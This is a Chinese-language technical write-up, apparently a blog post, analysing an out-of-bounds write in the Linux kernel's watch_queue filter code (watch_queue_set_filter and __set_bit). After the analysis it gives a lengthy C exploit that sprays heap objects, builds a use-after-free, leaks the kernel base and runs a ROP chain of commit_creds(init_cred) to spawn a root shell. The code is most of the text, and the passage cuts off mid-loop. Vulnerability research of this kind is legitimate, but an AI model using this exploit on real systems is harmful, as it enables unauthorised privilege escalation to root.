得到修复。\n基础知识通用通知机制是建立在标准管道驱动之上的，其可以有效地将来自内核的通知消息拼接到用户打开的管道中，我们可以通过 CONFIG_WATCH_QUEUE 编译选项启用（默认开启）\n该机制通过一个以特殊模式打开的管道实现，内核生成的消息被保存到管道内部的循环环形缓冲区中（pipe_buffer 队列），通过 read() 进行读取，由于在某些情况下我们可能想要将添加的内容还原到环上，因此在此类管道上禁用了 splice 以及类似功能（因为这可能导致其与通知消息交织在一起）\n管道的所有者应当告诉内核哪些资源其想要通过该管道进行观察，只有连接到该管道上的资源才会往里边插入消息，需要注意的是一个资源可能会与多个管道绑定并同时将消息插入所有管道\n若环中没有可用的插槽或可用的预分配的 message buffer（一个管道默认只有 16 个 pipe_buffer ——对应 16 张内存页），则消息将会被丢弃，在这两种情况下，read() 将在读取当前缓冲区的最后一条消息后将 WATCH_META_LOSS_NOTIFICATION 插入输出缓冲区。\nWatch Queue API一个观测队列（watch queue）是由一个应用分配的用以记录通知的缓冲区，其工作原理完全隐藏在管道设备驱动中，但有必要获得一个对其的引用以设置一个观测，可以通过以下 API 进行管理：\n\nstruct watch_queue *get_watch_queue(int fd);\n  由于观测队列在内核中通过实现缓冲区的管道的文件描述符表示，用户空间必须通过系统调用传递该文件描述符，这可以用于从系统调用中查找指向观测队列的不透明指针\n\nvoid put_watch_queue(struct watch_queue *wqueue);\n  该函数用以丢弃从 get_watch_queue() 获得的引用\n\n\nEvent Filter当一个观测队列被创建后，我们可以使用过滤器限制接收的事件：\nstruct watch_notification_filter &#123;\t__u32\tnr_filters;\t\t/* Number of filters */\t__u32\t__reserved;\t\t/* Must be 0 */\tstruct watch_notification_type_filter filters[];&#125;;struct watch_notification_filter filter = &#123;        ...&#125;;ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)\n\n这里主要解释一下结构体中的成员的含义，nr_filters成员表示的是filters[]数组中过滤器的数量，而可以看出来__reserved是必须置0的。需要注意的是其中filters[]数组的类型为watch_notification_type_filter：\nstruct watch_notification_type_filter &#123;\t__u32\ttype;\t\t\t/* Type to apply filter to */\t__u32\tinfo_filter;\t\t/* Filter on watch_notification::info */\t__u32\tinfo_mask;\t\t/* Mask of relevant bits in info_filter */\t__u32\tsubtype_filter[8];\t/* Bitmask of subtypes to filter on */&#125;;\n\n这里也是简单介绍一下其中的结构体的含义，首先是type代表的是需要过滤事件的类型：\nenum watch_notification_type &#123;\tWATCH_TYPE_META\t\t= 0,\t/* Special record */\tWATCH_TYPE_KEY_NOTIFY\t= 1,\t/* Key change event notification */\tWATCH_TYPE__NR\t\t= 2&#125;;\n\ninfo_filter成员与info_mask成员充当的是通知记录的信息字段的过滤器，仅当如下情况才会将通知写入缓冲区：\n(watch.info &amp; info_mask) == info_filter\n\nsubtype_filter成员则是指示我们感兴趣的字类型的bitmask，subtype_filter[0]的0位对应子类型0，1位对应子类型1…\n若是上面使用ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, NULL)则为移出过滤器，此时接受所有来自观测的信息。\nwatch queue subsystem 中 Event Filter 实现SYSCALL_DEFINE3(ioctl, unsigned int, fd, unsigned int, cmd, unsigned long, arg)&#123;\tstruct fd f = fdget(fd);\tint error;\tif (!f.file)\t\treturn -EBADF;\terror = security_file_ioctl(f.file, cmd, arg);\tif (error)\t\tgoto out;\terror = do_vfs_ioctl(f.file, fd, cmd, arg);\tif (error == -ENOIOCTLCMD)\t\terror = vfs_ioctl(f.file, cmd, arg);out:\tfdput(f);\treturn error;&#125;\n\n首先则是我们调用ioctl是会进入如上函数，并且通过验证之后最终会调用到do_vfs_ioctl函数，而这个函数内部就是一个硕大switch语句根据cmd进行处理，但是IOC_WATCH_QUEUE_SET_FILTER并不在其中，所以最终会调用到vfs_ioctl函数。\nlong vfs_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)&#123;\tint error = -ENOTTY;\tif (!filp-&gt;f_op-&gt;unlocked_ioctl)\t\tgoto out;\terror = filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg);\tif (error == -ENOIOCTLCMD)\t\terror = -ENOTTY; out:\treturn error;&#125;EXPORT_SYMBOL(vfs_ioctl);\n\n可以注意到的事这里其实调用的是filp-&gt;f_op-&gt;unlocked_ioctl函数，所以首要就是要搞明白这是个什么函数。\n前文提到，通知机制是建立在管道上面的，所以这里文件描述符其实也就是管道的，那么我们当前则需要更多的将目光放在管道的创建上面，而管道的创建存在以下调用关系：do_pipe2() =&gt; __do_pipe_flags() =&gt; create_pipe_files() =&gt; alloc_file_pseudo() =&gt; alloc_file()。\nstatic struct file *alloc_file(const struct path *path, int flags,\t\tconst struct file_operations *fop)&#123;\tstruct file *file;\tfile = alloc_empty_file(flags, current_cred());\tif (IS_ERR(file))\t\treturn file;\tfile-&gt;f_path = *path;\tfile-&gt;f_inode = path-&gt;dentry-&gt;d_inode;\tfile-&gt;f_mapping = path-&gt;dentry-&gt;d_inode-&gt;i_mapping;\tfile-&gt;f_wb_err = filemap_sample_wb_err(file-&gt;f_mapping);\tfile-&gt;f_sb_err = file_sample_sb_err(file);\tif ((file-&gt;f_mode &amp; FMODE_READ) &amp;&amp;\t     likely(fop-&gt;read || fop-&gt;read_iter))\t\tfile-&gt;f_mode |= FMODE_CAN_READ;\tif ((file-&gt;f_mode &amp; FMODE_WRITE) &amp;&amp;\t     likely(fop-&gt;write || fop-&gt;write_iter))\t\tfile-&gt;f_mode |= FMODE_CAN_WRITE;\tfile-&gt;f_mode |= FMODE_OPENED;\tfile-&gt;f_op = fop;\tif ((file-&gt;f_mode &amp; (FMODE_READ | FMODE_WRITE)) == FMODE_READ)\t\ti_readcount_inc(path-&gt;dentry-&gt;d_inode);\treturn file;&#125;\n\n可以看到的是这里对于ops的赋值是发生在这个位置的。\nint create_pipe_files(struct file **res, int flags)&#123;\tstruct inode *inode = get_pipe_inode();\tstruct file *f;\tint error;\tif (!inode)\t\treturn -ENFILE;\tif (flags &amp; O_NOTIFICATION_PIPE) &#123;\t\terror = watch_queue_init(inode-&gt;i_pipe);\t\tif (error) &#123;\t\t\tfree_pipe_info(inode-&gt;i_pipe);\t\t\tiput(inode);\t\t\treturn error;\t\t&#125;\t&#125;\tf = alloc_file_pseudo(inode, pipe_mnt, &quot;&quot;,\t\t\t\tO_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),\t\t\t\t&amp;pipefifo_fops);\tif (IS_ERR(f)) &#123;\t\tfree_pipe_info(inode-&gt;i_pipe);\t\tiput(inode);\t\treturn PTR_ERR(f);\t&#125;\tf-&gt;private_data = inode-&gt;i_pipe;\tres[0] = alloc_file_clone(f, O_RDONLY | (flags &amp; O_NONBLOCK),\t\t\t\t  &amp;pipefifo_fops);\tif (IS_ERR(res[0])) &#123;\t\tput_pipe_info(inode, inode-&gt;i_pipe);\t\tfput(f);\t\treturn PTR_ERR(res[0]);\t&#125;\tres[0]-&gt;private_data = inode-&gt;i_pipe;\tres[1] = f;\tstream_open(inode, res[0]);\tstream_open(inode, res[1]);\treturn 0;&#125;\n\n然而真正传入ops的是这个函数内部中，可以看到ops其实就是pipefifo_fops变量。\nconst struct file_operations pipefifo_fops = &#123;\t.open\t\t= fifo_open,\t.llseek\t\t= no_llseek,\t.read_iter\t= pipe_read,\t.write_iter\t= pipe_write,\t.poll\t\t= pipe_poll,\t.unlocked_ioctl\t= pipe_ioctl,\t.release\t= pipe_release,\t.fasync\t\t= pipe_fasync,\t.splice_write\t= iter_file_splice_write,&#125;;\n\n可以看到unlocked_ioctl对应的也就是pipe_ioctl函数。\nstatic long pipe_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)&#123;\tstruct pipe_inode_info *pipe = filp-&gt;private_data;\tint count, head, tail, mask;\tswitch (cmd) &#123;\tcase FIONREAD:\t\t__pipe_lock(pipe);\t\tcount = 0;\t\thead = pipe-&gt;head;\t\ttail = pipe-&gt;tail;\t\tmask = pipe-&gt;ring_size - 1;\t\twhile (tail != head) &#123;\t\t\tcount += pipe-&gt;bufs[tail &amp; mask].len;\t\t\ttail++;\t\t&#125;\t\t__pipe_unlock(pipe);\t\treturn put_user(count, (int __user *)arg);#ifdef CONFIG_WATCH_QUEUE\tcase IOC_WATCH_QUEUE_SET_SIZE: &#123;\t\tint ret;\t\t__pipe_lock(pipe);\t\tret = watch_queue_set_size(pipe, arg);\t\t__pipe_unlock(pipe);\t\treturn ret;\t&#125;\tcase IOC_WATCH_QUEUE_SET_FILTER:\t\treturn watch_queue_set_filter(\t\t\tpipe, (struct watch_notification_filter __user *)arg);#endif\tdefault:\t\treturn -ENOIOCTLCMD;\t&#125;&#125;\n\n而在函数内部其实也就是个大的switch语句，并且在最后有一个处理watch_queue_set_filter函数，而漏洞正发生在其中。\n漏洞分析漏洞点一long watch_queue_set_filter(struct pipe_inode_info *pipe,\t\t\t    struct watch_notification_filter __user *_filter)&#123;\tstruct watch_notification_type_filter *tf;\tstruct watch_notification_filter filter;\tstruct watch_type_filter *q;\tstruct watch_filter *wfilter;\tstruct watch_queue *wqueue = pipe-&gt;watch_queue;\tint ret, nr_filter = 0, i;\tif (!wqueue)\t\treturn -ENODEV;\tif (!_filter) &#123;\t\t/* Remove the old filter */\t\twfilter = NULL;\t\tgoto set;\t&#125;\t/* Grab the user&#x27;s filter specification */\tif (copy_from_user(&amp;filter, _filter, sizeof(filter)) != 0)\t\treturn -EFAULT;\tif (filter.nr_filters == 0 ||\t    filter.nr_filters &gt; 16 ||\t    filter.__reserved != 0)\t\treturn -EINVAL;\ttf = memdup_user(_filter-&gt;filters, filter.nr_filters * sizeof(*tf));\tif (IS_ERR(tf))\t\treturn PTR_ERR(tf);\tret = -EINVAL;\tfor (i = 0; i &lt; filter.nr_filters; i++) &#123;\t\tif ((tf[i].info_filter &amp; ~tf[i].info_mask) ||\t\t    tf[i].info_mask &amp; WATCH_INFO_LENGTH)\t\t\tgoto err_filter;\t\t/* Ignore any unknown types */\t\tif (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * 8)\t\t\tcontinue;\t\tnr_filter++;\t&#125;\t/* Now we need to build the internal filter from only the relevant\t * user-specified filters.\t */\tret = -ENOMEM;\twfilter = kzalloc(struct_size(wfilter, filters, nr_filter), GFP_KERNEL);\tif (!wfilter)\t\tgoto err_filter;\twfilter-&gt;nr_filters = nr_filter;\tq = wfilter-&gt;filters;\tfor (i = 0; i &lt; filter.nr_filters; i++) &#123;\t\tif (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * BITS_PER_LONG)\t\t\tcontinue;\t\tq-&gt;type\t\t\t= tf[i].type;\t\tq-&gt;info_filter\t\t= tf[i].info_filter;\t\tq-&gt;info_mask\t\t= tf[i].info_mask;\t\tq-&gt;subtype_filter[0]\t= tf[i].subtype_filter[0];\t\t__set_bit(q-&gt;type, wfilter-&gt;type_filter);\t\tq++;\t&#125;\tkfree(tf);set:\tpipe_lock(pipe);\twfilter = rcu_replace_pointer(wqueue-&gt;filter, wfilter,\t\t\t\t      lockdep_is_held(&amp;pipe-&gt;mutex));\tpipe_unlock(pipe);\tif (wfilter)\t\tkfree_rcu(wfilter, rcu);\treturn 0;err_filter:\tkfree(tf);\treturn ret;&#125;\n\n首先则是将用户空间的_filter拷贝到内核中，接着就是对结构体中的nr_filters和__reservede成员进行验证。\nif (copy_from_user(&amp;filter, _filter, sizeof(filter)) != 0)  return -EFAULT;if (filter.nr_filters == 0 ||    filter.nr_filters &gt; 16 ||    filter.__reserved != 0)  return -EINVAL;\n\n接下来通过memdup_user函数将用户态struct watch_notification_type_filter filters[]数组放到临时的内存空间tf中。紧接着将根据filter.nr_filters进行for循环，并对tf中的内容进行校验。待都通过则会根据struct_size(wfilter, filters, nr_filter)生成一个object，而这个宏定义的含义其实是sizeof(wfilter) + sizeof(filters) * nr_filter。并且需要注意的是这里nr_filter并不是任何结构体中的成员，只是函数声明的一个局部变量\nfor (i = 0; i &lt; filter.nr_filters; i++) &#123;  if (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * BITS_PER_LONG)    continue;  q-&gt;type\t\t\t= tf[i].type;  q-&gt;info_filter\t\t= tf[i].info_filter;  q-&gt;info_mask\t\t= tf[i].info_mask;  q-&gt;subtype_filter[0]\t= tf[i].subtype_filter[0];  __set_bit(q-&gt;type, wfilter-&gt;type_filter);  q++;&#125;\n\n如上代码片段，在后面通过for循环使用的却是filter.nr_filters并且这里对于type的验证验证和上面的也不相同。\n#ifdef CONFIG_64BIT#define BITS_PER_LONG 64#else#define BITS_PER_LONG 32#endif /* CONFIG_64BIT */if (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * 8)if (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * BITS_PER_LONG)\n\n所以不难想到的是可以通过指定type的值为这个[0x80, 0x400)区间内的特定值即可实现越界写。\n漏洞点二而第二个漏洞也位于在最后赋值时的__set_bit函数中\n#define BIT_MASK(nr)\t\t(UL(1) &lt;&lt; ((nr) % BITS_PER_LONG))#define BIT_WORD(nr)\t\t((nr) / BITS_PER_LONG)static inline void __set_bit(int nr, volatile unsigned long *addr)&#123;\tunsigned long mask = BIT_MASK(nr);\tunsigned long *p = ((unsigned long *)addr) + BIT_WORD(nr);\t*p  |= mask;&#125;\n\n这个函数的作用就是将addr偏移为BIT_WORD(nr)处的BIT_MASK(nr)位置为1，因为type是可控的，所以控制得当的话可以越界置一位为1。\nstruct watch_type_filter &#123;\tenum watch_notification_type type;\t__u32\t\tsubtype_filter[1];\t/* Bitmask of subtypes to filter on */\t__u32\t\tinfo_filter;\t\t/* Filter on watch_notification::info */\t__u32\t\tinfo_mask;\t\t/* Mask of relevant bits in info_filter */&#125;;struct watch_filter &#123;\tunion &#123;\t\tstruct rcu_head\trcu;\t\tunsigned long\ttype_filter[2];\t/* Bitmask of accepted types */\t&#125;;\tu32\t\t\tnr_filters;\t/* Number of filters */\tstruct watch_type_filter filters[];&#125;;\n\n上面的watch_filter长这样。\n漏洞利用网上的有关这个CVE使用的方法几乎都是利用的漏洞二。当然，仔细想一下也会发现漏洞二在利用的过程中更为易用。接着就是思考溢出问题了，若是我们选择一个type为0x30a的话，我们得到的偏移为(0x30a / 64) * 8 = 0x60，所以我们只需要让上面的object的大小为0x60即可影响到后面的object了。所以我们这里选择的nr_filters为4，除去上面的这一个即为3。那么此时内核给wfilter分配的大小为0x18 + 3 * 0x10 = 0x48所以可以申请到0x60的object。这时再根据BIT_MASK计算可得最终结果为0x400。\n其实说到这里的时候各位应该都想到了解题方法了吧。对的，可以使用 CVE-2021-22555 即可完成后续利用 (这里不再详细解释了)。\n综上，可得exp#define _GNU_SOURCE#include &lt;err.h&gt;#include &lt;errno.h&gt;#include &lt;inttypes.h&gt;#include &lt;sched.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ipc.h&gt;#include &lt;sys/msg.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/types.h&gt;#include &lt;linux/watch_queue.h&gt;#include &lt;sys/syscall.h&gt;struct callback_head&#123;    struct callback_head *next;    void (*func)(struct callback_head *head);&#125; __attribute__((aligned(sizeof(void *))));#define rcu_head callback_headstruct watch_type_filter&#123;    enum watch_notification_type type;    unsigned int subtype_filter[1]; /* Bitmask of subtypes to filter on */    unsigned int info_filter;       /* Filter on watch_notification::info */    unsigned int info_mask;         /* Mask of relevant bits in info_filter */&#125;;struct watch_filter&#123;    union    &#123;        struct rcu_head rcu;        unsigned long type_filter[2]; /* Bitmask of accepted types */    &#125;;    unsigned int nr_filters; /* Number of filters */    struct watch_type_filter filters[];&#125;;void errExit(char *err_msg)&#123;    puts(err_msg);    exit(-1);&#125;size_t user_cs, user_ss, user_sp, user_rflags;void save_status()&#123;    __asm__(        &quot;mov user_cs, cs;&quot;        &quot;mov user_ss, ss;&quot;        &quot;mov user_sp, rsp;&quot;        &quot;pushf;&quot;        &quot;pop user_rflags;&quot;);    puts(&quot;[*]status has been saved.&quot;);&#125;#define MSG_COPY 040000#define MSG_TAG 0xAAAAAAAA#define PRIMARY_MSG_TYPE 0x41#define SECONDARY_MSG_TYPE 0x42#define MSG_QUEUE_NUM 4096#define PRIMARY_MSG_SIZE 96#define SECONDARY_MSG_SIZE 0x400#define VICTIM_MSG_TYPE 0x1337#define SOCKET_NUM 32#define SK_BUFF_NUM 128#define PIPE_NUM 256#define OOB_PIPE_NUM 100struct list_head&#123;    struct list_head *next, *prev;&#125;;struct msg_msgseg&#123;    uint64_t next;&#125;;struct msg_msg&#123;    struct list_head m_list;    long m_type;    size_t m_ts;    /* message text size */    void *next;     /* struct msg_msgseg *next; */    void *security; /* NULL without SELinux */    /* the actual message follows immediately */&#125;;struct pipe_buffer&#123;    uint64_t page;    uint32_t offset, len;    uint64_t ops;    uint32_t flags;    uint32_t padding;    uint64_t private;&#125;;struct pipe_buf_operations&#123;    uint64_t confirm;    uint64_t release;    uint64_t try_steal;    uint64_t get;&#125;;struct&#123;    long mtype;    char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];&#125; primary_msg;struct&#123;    long mtype;    char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];&#125; secondary_msg;struct&#123;    long mtype;    char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 - sizeof(struct msg_msgseg)];&#125; oob_msg;void get_shell()&#123;    if (getuid())    &#123;        printf(&quot;\\033[31m\\033[1m[x] Failed to get the root!\\033[0m\\n&quot;);        exit(-1);    &#125;    printf(&quot;\\033[32m\\033[1m[+] Successful to get the root. Execve root shell now...\\033[0m\\n&quot;);    system(&quot;/bin/sh&quot;);&#125;void trigger_overflow(int oob_pipe[2])&#123;    struct watch_notification_filter *wfilter;    unsigned int nfilters;    nfilters = 4;    wfilter = (struct watch_notification_filter *)        calloc(1, sizeof(struct watch_notification_filter) + nfilters * sizeof(struct watch_notification_type_filter));    wfilter-&gt;nr_filters = nfilters;    for (int i = 0; i &lt; (nfilters - 1); i++)        wfilter-&gt;filters[i].type = 1;    wfilter-&gt;filters[nfilters - 1].type = 0x30a;    if (ioctl(oob_pipe[0], IOC_WATCH_QUEUE_SET_FILTER, wfilter) &lt; 0)        errExit(&quot;failed to ioctl IOC_WATCH_QUEUE_SET_FILTER!&quot;);    free(wfilter);&#125;int main()&#123;    save_status();    int oob_pipe_fd[2];    int i = 0;    char *buf = malloc(0x2000);    int sk_sockets[SOCKET_NUM][2];    int msqid[MSG_QUEUE_NUM];    int victim_qid = -1;    char fake_secondary_msg[704];    int oob_qid = -1;    struct msg_msg *nearby_msg;    struct msg_msg *nearby_msg_prim;    int pipe_fd[PIPE_NUM][2];    cpu_set_t cpu_set;    CPU_ZERO(&amp;cpu_set);    CPU_SET(0, &amp;cpu_set);    sched_setaffinity(getpid(), sizeof(cpu_set), &amp;cpu_set);    for (int i = 0; i &lt; SOCKET_NUM; i++)        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sk_sockets[i]) &lt; 0)            errExit(&quot;failed to create socket pair!&quot;);    for (int i = 0; i &lt; MSG_QUEUE_NUM; i++)    &#123;        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) &lt; 0)            errExit(&quot;failed to create msg_queue!&quot;);    &#125;    puts(&quot;\\n\\033[34m\\033[1m[*] spray msg_msg, construct overlapping object\\033[0m&quot;);    memset(&amp;primary_msg, 0, sizeof(primary_msg));    memset(&amp;secondary_msg, 0, sizeof(secondary_msg));    *(long *)&amp;primary_msg = PRIMARY_MSG_TYPE;    *(long *)&amp;secondary_msg = SECONDARY_MSG_TYPE;    *(int *)&amp;primary_msg.mtext[0] = MSG_TAG;    *(int *)&amp;secondary_msg.mtext[0] = MSG_TAG;    strcpy(&amp;primary_msg.mtext[0x8], &quot;this is first msg_msg!&quot;);    if (pipe2(oob_pipe_fd, O_NOTIFICATION_PIPE) &lt; 0)        errExit(&quot;failed to create O_NOTIFICATION_PIPE!&quot;);    for (int i = 0; i &lt; MSG_QUEUE_NUM; i++)    &#123;        *(int *)&amp;primary_msg.mtext[0] = MSG_TAG;        *(int *)&amp;primary_msg.mtext[4] = i;        if (msgsnd(msqid[i], &amp;primary_msg,                   sizeof(primary_msg) - 8, 0) &lt; 0)            errExit(&quot;failed to send primary msg!&quot;);        *(int *)&amp;secondary_msg.mtext[0] = MSG_TAG;        *(int *)&amp;secondary_msg.mtext[4] = i;        if (msgsnd(msqid[i], &amp;secondary_msg,                   sizeof(secondary_msg) - 8, 0) &lt; 0)            errExit(&quot;failed to send secondary msg!&quot;);    &#125;    puts(&quot;[*] Create holes in primary msg_msg...&quot;);    for (int i = 0; i &lt; MSG_QUEUE_NUM; i += 1024)    &#123;        if (msgrcv(msqid[i], &amp;primary_msg, sizeof(primary_msg), PRIMARY_MSG_TYPE, 0) &lt; 0)        &#123;            errExit(&quot;failed to read msg!&quot;);        &#125;    &#125;    trigger_overflow(oob_pipe_fd);    puts(&quot;\\n\\033[34m\\033[1m[*] construct UAF\\033[0m&quot;);    for (int i = 0; i &lt; MSG_QUEUE_NUM; i++)    &#123;        if (i % 1024 == 0)        &#123;            continue;        &#125;        if (msgrcv(msqid[i], &amp;secondary_msg, sizeof(secondary_msg) - 8, 1, MSG_COPY | IPC_NOWAIT) &lt; 0)        &#123;            errExit(&quot;failed to read msg!&quot;);        &#125;        if (*(int *)&amp;secondary_msg.mtext[4] != i)        &#123;            victim_qid = i;            oob_qid = *(int *)&amp;secondary_msg.mtext[4];        &#125;    &#125;    if (victim_qid == -1 || oob_qid == -1)    &#123;        errExit(&quot;[-] failed find victim msg!&quot;);    &#125;    printf(&quot;[+] find victim id: %d, oob id: %d\\n&quot;, victim_qid, oob_qid);    if (msgrcv(msqid[oob_qid], &amp;secondary_msg, sizeof(secondary_msg), SECONDARY_MSG_TYPE, 0) &lt; 0)    &#123;        errExit(&quot;failed to read msg!&quot;);    &#125;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = 0x1000 - sizeof(struct msg_msg);    ((struct msg_msg *)fake_secondary_msg)-&gt;next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;security = NULL;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    if (msgrcv(msqid[victim_qid], &amp;oob_msg, sizeof(oob_msg) - 8, 1, MSG_COPY | IPC_NOWAIT) &lt; 0)    &#123;        errExit(&quot;failed to read victim msg!&quot;);    &#125;    if (*(int *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)        errExit(&quot;failed to rehit the UAF object!&quot;);    nearby_msg = (struct msg_msg *)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE - sizeof(struct msg_msg))];    printf(&quot;\\033[32m\\033[1m[+] addr of primary msg of msg nearby victim: \\033[0m%p\\n&quot;,           nearby_msg-&gt;m_list.prev);    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to release sk_buff!&quot;);            &#125;        &#125;    &#125;    uint64_t search_addr = (unsigned long *)nearby_msg-&gt;m_list.prev;    search_addr = search_addr - 8;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = sizeof(oob_msg.mtext);    ((struct msg_msg *)fake_secondary_msg)-&gt;next = search_addr;    ((struct msg_msg *)fake_secondary_msg)-&gt;security = NULL;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    if (msgrcv(msqid[victim_qid], &amp;oob_msg, sizeof(oob_msg), 1, MSG_COPY | IPC_NOWAIT) &lt; 0)    &#123;        errExit(&quot;failed to read victim msg!&quot;);    &#125;    if (*(int *)&amp;oob_msg.mtext[0x1000] != MSG_TAG)        errExit(&quot;failed to rehit the UAF object!&quot;);    nearby_msg_prim = (struct msg_msg *)&amp;oob_msg.mtext[0x1000 - sizeof(struct msg_msg)];    uint64_t victim_addr = (unsigned long *)(nearby_msg_prim-&gt;m_list.next);    victim_addr = victim_addr - 0x400;    printf(&quot;\\033[32m\\033[1m[+] addr of msg next to victim: \\033[0m%p\\n&quot;,           nearby_msg_prim-&gt;m_list.next);    printf(&quot;\\033[32m\\033[1m[+] addr of msg UAF object: \\033[0m%p\\n&quot;, victim_addr);    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to release sk_buff!&quot;);            &#125;        &#125;    &#125;    puts(&quot;\\n\\033[34m\\033[1m[*] spray pipe_buffer to leak kernel base\\033[0m&quot;);    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = victim_addr + 0x800;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = victim_addr + 0x800;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = 1024 - 0x30;    ((struct msg_msg *)fake_secondary_msg)-&gt;next = NULL;    ((struct msg_msg *)fake_secondary_msg)-&gt;security = NULL;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    if (msgrcv(msqid[victim_qid], &amp;secondary_msg, sizeof(secondary_msg), VICTIM_MSG_TYPE, IPC_NOWAIT | MSG_NOERROR) &lt; 0)    &#123;        errExit(&quot;failed to read victim msg!&quot;);    &#125;    for (int i = 0; i &lt; PIPE_NUM; i++)    &#123;        if (pipe(pipe_fd[i]) &lt; 0)            errExit(&quot;failed to create pipe!&quot;);        if (write(pipe_fd[i][1], &quot;196082&quot;, 6) &lt; 0)            errExit(&quot;failed to write the pipe!&quot;);    &#125;    struct pipe_buffer *pipe_buf_ptr = (struct pipe_buffer *)&amp;fake_secondary_msg;    uint64_t kernel_addr, kernel_offset, kernel_base;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (read(sk_sockets[i][1], &amp;fake_secondary_msg,                     sizeof(fake_secondary_msg)) &lt; 0)                errExit(&quot;failed to release sk_buff!&quot;);            if (pipe_buf_ptr-&gt;ops &gt; 0xffffffff81000000)            &#123;                printf(&quot;\\033[32m\\033[1m[+] got pipe_buf_ops: \\033[0m%p\\n&quot;,                       pipe_buf_ptr-&gt;ops);                kernel_addr = (unsigned long *)(pipe_buf_ptr-&gt;ops);                kernel_offset = (kernel_addr - 0xffffffff8203fe40);                kernel_base = 0xffffffff81000000 + kernel_offset;            &#125;        &#125;    &#125;    printf(&quot;\\033[32m\\033[1m[+] kernel base: \\033[0m%p \\033[32m\\033[1moffset: \\033[0m%p\\n&quot;,           kernel_base, kernel_offset);    puts(&quot;\\n\\033[34m\\033[1m[*] hijack the ops of pipe_buffer, gain root privilege\\033[0m&quot;);    unsigned long pop_rdi = 0xffffffff810938f0 + kernel_offset;    unsigned long init_cred = 0xffffffff82c6d580 + kernel_offset;    unsigned long commit_cred = 0xffffffff810d25c0 + kernel_offset;    unsigned long swapgs_restore_regs_and_return_to_usermode = 0xffffffff81c00ff0 + kernel_offset;    unsigned long push_rsi_pop_rsp_pop_4reg_ret = 0xffffffff812dbede + kernel_offset;    pipe_buf_ptr-&gt;page = *(uint64_t *)&quot;196082&quot;;    pipe_buf_ptr-&gt;ops = victim_addr + 0x100;    struct pipe_buf_operations *ops_ptr = (struct pipe_buf_operations *)&amp;fake_secondary_msg[0x100];    ops_ptr-&gt;release = push_rsi_pop_rsp_pop_4reg_ret;    int rop = 0;    unsigned long *rop_chain;    rop_chain = (uint64_t *)&amp;fake_secondary_msg[0x20];    rop_chain[rop++] = pop_rdi;    rop_chain[rop++] = init_cred;    rop_chain[rop++] = commit_cred;    rop_chain[rop++] = swapgs_restore_regs_and_return_to_usermode + 0x16;    rop_chain[rop++] = 0;    rop_chain[rop++] = 0;    rop_chain[rop++] = get_shell;    rop_chain[rop++] = user_cs;    rop_chain[rop++] = user_rflags;    rop_chain[rop++] = user_sp;    rop_chain[rop++] = user_ss;    for (int i = 0; i &lt; SOCKET_NUM; i++)    &#123;        for (int j = 0; j &lt; SK_BUFF_NUM; j++)        &#123;            if (write(sk_sockets[i][0], fake_secondary_msg, sizeof(fake_secondary_msg)) &lt; 0)            &#123;                errExit(&quot;failed to spray sk_buff!&quot;);            &#125;        &#125;    &#125;    for (int i = 0; i 